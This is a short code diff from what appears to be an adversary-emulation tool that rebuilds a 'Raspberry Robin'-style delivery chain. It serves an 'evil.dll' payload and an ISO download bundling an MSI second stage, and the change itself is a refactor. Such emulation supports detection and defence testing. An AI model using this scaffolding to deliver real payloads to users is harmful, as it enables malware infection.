@@ -10,7 +10,7 @@ from make.iso.iso import makeIso
 from make.cmd.cmd import *
 
 from helpers import *
-from model import AceFile, AceRoute
+from model import *
 
 
 def raspberryrobin(baseUrl) -> List[AceRoute]:
@@ -19,7 +19,7 @@ def raspberryrobin(baseUrl) -> List[AceRoute]:
 
     # DLL: Payload
     evilDll: AceBytes = readFileContent('payloads/evil.dll')
-    evilDllroute = AceRoute('/evil.dll', evilDll)
+    evilDllroute = makeAceRoute('/evil.dll', evilDll)
     routes.append(evilDllroute)
 
     # MSI: stage 2
@@ -57,7 +57,7 @@ def raspberryrobin(baseUrl) -> List[AceRoute]:
         msiFile,
     ])
     # containerFile: AceFile = makeAceFile('test.iso', container)
-    isoRoute: AceRoute = AceRoute('/test.iso', container, download=True, downloadName='test.iso')
+    isoRoute: AceRoute = makeAceRoute('/test.iso', container, download=True, downloadName='test.iso')
     routes.append(isoRoute)
 
     return routes
